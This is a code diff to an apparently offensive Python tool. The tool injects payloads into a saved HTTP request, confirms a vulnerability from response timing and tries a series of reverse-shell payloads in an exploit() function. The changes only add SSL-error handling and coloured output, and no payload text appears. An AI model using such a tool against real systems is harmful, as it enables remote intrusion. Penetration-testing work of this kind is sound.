@@ -186,7 +186,7 @@ def read_file(path: str) -> list[str]:
         req_file = open(path, 'r')
         print("[+] Using request file: ", path)
     except Exception as e:
-        print("[+] Error opening file: ", path)  # print_red
+        print_red("[+] Error opening file: ", path)  # print_red
         exit(1)
 
     lines = req_file.readlines()
@@ -250,9 +250,13 @@ def measure_avg_rtt(req_lines, http):
         num_reqs = 5
 
         for k in range(num_reqs):
-            response = requests.Session().send(prepared_req, verify=False)
+            try:
+                response = requests.Session().send(prepared_req, verify=False)
+            except requests.exceptions.SSLError:
+                print_red("[+] SSL error. Use --http flag?")
+                exit(1)
+    
             total_rtt += response.elapsed.total_seconds()
-
 
         average_rtt = total_rtt/num_reqs 
         print(f"[+] Average RTT is: {average_rtt} seconds.")
@@ -273,6 +277,7 @@ def confirm_vuln():
 
 
     avg_rtt = measure_avg_rtt(req_lines=request, http=g_args.http)
+    # time.sleep(123)
     #TODO: isprobati vec serijalizirane objekte
 
 
@@ -286,10 +291,15 @@ def confirm_vuln():
             (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
             req = Request(method=method, url=url, headers=headers, data=data)
             prepared_req = req.prepare()
-            if proxy_servers is not None:
-                response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
-            else:
-                response = requests.Session().send(prepared_req, verify=False)
+
+            try:
+                if proxy_servers is not None:
+                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+                else:
+                    response = requests.Session().send(prepared_req, verify=False)
+            except requests.exceptions.SSLError:
+                print_red("[+] SSL error. Use --http flag?")
+                exit(1)
 
             print("[+] Response time:", response.elapsed.total_seconds()) #microseconds?
 
@@ -335,10 +345,15 @@ def exploit():
                 (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
                 req = Request(method=method, url=url, headers=headers, data=data)
                 prepared_req = req.prepare()
-                if proxy_servers is not None:
-                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
-                else:
-                    response = requests.Session().send(prepared_req, verify=False)
+
+                try:
+                    if proxy_servers is not None:
+                        response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+                    else:
+                        response = requests.Session().send(prepared_req, verify=False)
+                except requests.exceptions.SSLError:
+                    print_red("[+] SSL error. Use --http flag?")
+                    exit(1)
             print(f"[+] Tried reverse shell num #{rs_index}")
         
 
@@ -360,10 +375,14 @@ def exploit():
             (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
             req = Request(method=method, url=url, headers=headers, data=data)
             prepared_req = req.prepare()
-            if proxy_servers is not None:
-                response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
-            else:
-                response = requests.Session().send(prepared_req, verify=False)
+            try:
+                if proxy_servers is not None:
+                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+                else:
+                    response = requests.Session().send(prepared_req, verify=False)
+            except requests.exceptions.SSLError:
+                    print_red("[+] SSL error. Use --http flag?")
+                    exit(1)
             
             print(f"\t[+] Sent request num #{num + 1} ")
 
